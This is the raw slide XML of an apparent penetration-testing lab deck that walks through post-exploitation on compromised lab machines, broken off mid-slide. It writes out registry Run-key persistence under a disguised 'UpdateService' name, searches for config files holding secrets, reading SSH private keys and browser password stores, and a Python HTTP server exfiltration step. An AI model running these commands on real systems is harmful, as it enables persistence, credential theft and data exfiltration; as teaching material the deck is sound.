              <a:rPr lang="en-US" altLang="en-U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 Registry Alternative (System-Wide)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reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1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UpdateService</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A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/t REG_SZ /d "C:\Users\Public\calc.exe"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A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Requires admin rights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800" b="1" dirty="0"/>
              <a:t>💡 Why stronger?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Runs on boot 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No login needed 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Highest privilege</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2450766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+mj-lt"/>
              </a:rPr>
              <a:t>Method 2 — Registry Run Key  do it inside the shell of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> of a compromised sys win 7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Registry Run Keys</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> are startup entries in the Windows Registry. Anything placed there can be launched </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>automatically when the user logs in, which makes it a common persistence location.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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> C:\Users\Public\calc.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt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7030A0"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Test-Path C:\Users\Public\calc.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Concept</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Windows auto-runs programs from registry at login.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+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>📍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Key Location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HKCU\Software\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600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CurrentVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="16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\Run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Add Entry</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1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reg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0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add HKCU\Software\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1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CurrentVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0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\Run /v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0" err="1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UpdateService</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0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/t REG_SZ /d "C:\Windows\System32\calc.exe" /f</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Segoe UI Symbol" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>🔍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Breakdown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+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/v</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="16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→ value name (should look normal)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+mj-lt"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="16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→ payload path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>
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/f = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>force overwrite without asking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt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latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Prevents prompts like:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>“Value already exists, overwrite?”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="16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+mj-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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671254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934"/>
            <a:ext cx="6780628" cy="6814066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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Step 2 — Verify Entry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reg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="19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query HKCU\Software\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1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CurrentVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0"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\Run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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+mj-lt"/>
              </a:rPr>
              <a:t>Or even better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 err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>reg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> query HKCU\Software\Microsoft\Windows\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>CurrentVersion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>\Run /v </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>UpdateService</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Step 3 — Test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dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Log out</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0"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+mj-lt"/>
              </a:rPr>
              <a:t>shutdown /l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+mj-lt"/>
              </a:rPr>
              <a:t>👉 This logs you out instantly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:latin typeface="+mj-lt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sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>   Log out → log back in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900" dirty="0">
              <a:latin typeface="+mj-lt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dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>log back in </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>Click your user (if needed)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+mj-lt"/>
              </a:rPr>
              <a:t>Enter your password or PIN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+mj-lt"/>
              </a:rPr>
              <a:t>Press </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Enter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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9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900" dirty="0">
              <a:latin typeface="+mj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675D0-6652-493A-8392-D37039C39262}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6780628" y="0"/>
            <a:ext cx="630750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+mj-lt"/>
              </a:rPr>
              <a:t>🎯 When does your test happen?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</a:rPr>
              <a:t>Right </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>after you log in</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="18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</a:rPr>
              <a:t>Windows checks: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</a:rPr>
              <a:t>HKCU\Software\Microsoft\Windows\CurrentVersion\Run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</a:rPr>
              <a:t>Then runs your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+mj-lt"/>
              </a:rPr>
              <a:t>C:\Users\Public\calc.exe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+mj-lt"/>
              </a:rPr>
              <a:t>What you should see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+mj-lt"/>
              </a:rPr>
              <a:t>If using calc.exe → Calculator opens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+mj-lt"/>
              </a:rPr>
              <a:t>If custom file → that program runs </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13492170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83197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TASK 4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14620640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2900"/>
            <a:ext cx="11379200" cy="9826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Task 04: Post-Exploit Enumeration &amp; Data Exfiltration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97000"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Find the "Crown Jewels"—passwords, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> files, and sensitive data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Search for configuration files (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>web.config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>, settings.py, .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>) that might contain database passwords. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Credential Harvesting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Dump browser-stored passwords or search for SSH private keys (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Exfiltration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Transfer a small sensitive file from the target to your machine using SCP, Python3 HTTP server, or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: Remember that "Data" is the ultimate goal of any attack, not just the shell. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42527021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036234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+mj-lt"/>
              </a:rPr>
              <a:t>🧾 Task 04 — Post-Exploitation &amp; Data Exfiltration Done inside the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>mfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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+mj-lt"/>
              </a:rPr>
              <a:t>🎯 Objective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+mj-lt"/>
              </a:rPr>
              <a:t>Find and extract sensitive data (“Crown Jewels”)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+mj-lt"/>
              </a:rPr>
              <a:t>Our target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>The same machine you already compromised earlier</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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+mj-lt"/>
              </a:rPr>
              <a:t>Step 1 — Get session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+mj-lt"/>
              </a:rPr>
              <a:t>In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt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+mj-lt"/>
              </a:rPr>
              <a:t>sessions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+mj-lt"/>
              </a:rPr>
              <a:t>Step 2 — Interact with target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+mj-lt"/>
              </a:rPr>
              <a:t>sessions -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>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EBFE93-D28E-4A10-A00F-9855535A64BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="200190"/>
            <a:ext cx="6126480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🔍 Step 3 — Find Configuration Files (on Target)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🐧 if the compromised target is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Linux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🔴 Find .env files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find / -name ".env" 2&gt;/dev/null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🔴 Find settings.py (Django apps)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find / -name "settings.py" 2&gt;/dev/null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🔴 Find generic config files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find / -name "*config*" 2&gt;/dev/null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if the compromised target is  Windows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/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /s *.config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/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> /s *.env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Why?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Config files often contain database usernames and passwords</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13896399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65401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+mj-lt"/>
              </a:rPr>
              <a:t>Windows Target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🔴 Find </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>web.config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (IIS / .NET apps)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> C:\ /s /b </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>web.config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🔴 Find .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> C:\ /s /b *.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>env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🔴 Find settings.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> C:\ /s /b settings.py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📖 Step 2 — Read the Files (on TARGET)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🐧If target is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> 2 Linux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cat /path/to/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>env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cat /path/to/settings.py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If target is  Windows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type C:\path\to\web.config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type C:\path\to\.env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What You’re Looking For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DB_USERNAME=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DB_PASSWORD=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API_KEY=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SECRET_KEY=</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41095422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781822" cy="617696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🔑 Step 4 — Credential Harvesting (on TARGET)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🐧 If target is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> 2 Linux — SSH Private Keys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ls -la ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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👉 Look for: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 err="1"/>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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Read it: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cat ~/.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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If target is  Windows — Search for Sensitive Files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 err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> C:\Users\ /s /b | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>findstr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> "password"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Windows — Browser Stored Credentials (Concept)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Check browser data locations (Chrome/Edge profiles):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C:\Users\&lt;user&gt;\AppData\Local\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57C9F-485A-4E5C-83F5-D3FE2E68A2C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6065520" y="0"/>
            <a:ext cx="6126480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👉 Look for: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Login Data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Saved credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> What to Look For</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Passwords  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> API keys  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SSH private keys (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>id_rsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Backup/config files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⚠️ Important Fix in Your Version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🔴 Add this line (VERY IMPORTANT)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Browser credentials are also stored locally and can be extracted from user profile directories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31404771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008098" cy="6858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📦 Task 04 — Exfiltration (Final Practical Solution)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🎯 Objective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Transfer a sensitive file from target → attacker machine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🔴 Method 1 — Python HTTP Server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📍 On Target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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> 8000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📍 On Attacker (Kali)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 err="1"/>
